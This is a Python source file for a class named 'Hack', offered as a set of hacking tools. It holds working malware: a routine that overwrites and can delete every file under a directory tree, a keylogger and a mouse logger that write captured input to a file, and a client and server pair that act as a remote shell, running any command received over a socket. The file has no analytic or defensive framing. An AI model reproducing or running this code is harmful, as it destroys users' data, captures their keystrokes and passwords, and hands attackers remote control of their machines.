import os
import subprocess
import socket

########### [SUB-CLASSES] #################### TASK CLASS ################# Over:Default Under:FileWrapper

class Hack(object):
    """
   Python Class that provide useful Hacking Tools.
    """

    DEVELOPER = "Marco Della Putta"

    @staticmethod
    def infect(source=None, path=os.getcwd(), ext="",start=False, delete_source=False, delete_infected=False, delay=None, action=None):

        from subprocess import run
        from time import sleep as _sp

        if source:
            with open(source, 'r') as src:
                contents = src.read()
        else:
            contents = "https://grigoprg.webnode.it"

        for RootDir, __Fldrs__, _file in os.walk(path):
            for _file_ in _file:
                _path = RootDir + "\\" + _file_
                try:
                    if ext == "":
                        with open(_path, 'w') as fw:
                            fw.write(contents)
                        if action:
                            action()
                        if start:
                            run(f'start {_path}', shell=True)
                        if delay:
                            _sp(delay)
                        if delete_infected:
                            try:
                                os.unlink(_path)
                            except:
                                os.remove(_path)
                    else:
                        if _file_.endswith(ext):
                            with open(_path, 'w') as fw:
                                fw.write(contents)
                            if action:
                                action()
                            if start:
                                run(f'start {_path}', shell=True)
                            if delay:
                                _sp(delay)
                            if delete_infected:
                                try:
                                    os.unlink(_path)
                                except:
                                    os.remove(_path)
                except:
                    pass

        if delete_source:
            try:
                try:
                    os.unlink(file_source)
                except:
                    os.remove(file_source)
            except:
                pass    
            
    @classmethod      
    def class_name(cls):
        return cls.__name__
    
    @staticmethod
    def keylog(_path_):
        from pynput.keyboard import Key, Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(key)

        with Listener(on_press=on_press) as listener:
            listener.join()
            
    @staticmethod
    def clicklog(_path_):
        from pynput.mouse import Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format="%(asctime)s: %(message)s")

        def on_move(x, y):
            logging.info("Mouse moved to ({0},{1})".format(x, y))

        def on_click(x, y, button, pressed):
            if pressed:
                logging.info("Mouse clicked at ({0},{1}) with {2}".format(x, y, button))

        def on_scroll(x, y, dx, dy):
            logging.info("Mouse scrolled at ({0},{1})({2},{3})".format(x, y, dx, dy))

        with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
            listener.join()

    @staticmethod
    def Local_Backdoor(host, port, buffer=4096):
        try:
            NO_USE = subprocess.run("chcp 65001", shell=True, stdout=subprocess.PIPE)
        except:
             pass

        _HOST = host
        _PORT = port

        socket_backdoor = socket.socket()
        socket_backdoor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_backdoor.connect((_HOST, _PORT))

        while True:
            command = input('>>>')
            socket_backdoor.send(command.encode())

            data = socket_backdoor.recv(buffer).decode()
            print(data)

        socket_backdoor.close()
        return None

    @staticmethod
    def Remote_Server(host, port, backdoor_number=1, buffer=4096):

        try:
            os.system("chcp 65001")
        except:
            pass
        
        _HOST = host
        _PORT = port

        socket_server = socket.socket()
        socket_server.bind((_HOST,_PORT))
        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_server.listen(backdoor_number)
        connection, (target_ip, target_port) = socket_server.accept()

        while True:
            _backsniff = connection.recv(buffer).decode()

            if _backsniff.lower() == 'quit' or _backsniff.lower() == 'exit':
                break

            if _backsniff.lower().startswith('cd'):
                try:
                    os.chdir(_backsniff.split()[1])
                    response = f'Directory changed to :: {_backsniff.split()[1]}'
                except:
                    try:
                        os.chdir(os.getcwd() + "\\" + _backsniff.split()[1])
                        response = f'Directory changed to :: {_backsniff.split()[1]}'
                    except:
                        response = f'Failed to change directory to :: {_backsniff.split()[1]}'
                        
            elif _backsniff.lower() == 'cwd':
                response = str(os.getcwd())
                        
            elif _backsniff.lower().startswith('del'):
                try:
                    os.unlink(_backsniff.split()[1])
                    response = f'File Deleted :: {_backsniff.split()[1]}'
                except:
                    response = f'Failed to delete :: {_backsniff.split()[1]}'

            else:
                response= subprocess.run(_backsniff, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                response = str(response.stdout) + str(response.stderr)
                response = response.replace('\\n','\n')
                response = response.replace('\\t','\t')
                response = response.replace('\\r','\r')
                response = response.replace('\\\\','\\')

            connection.send(response.encode())

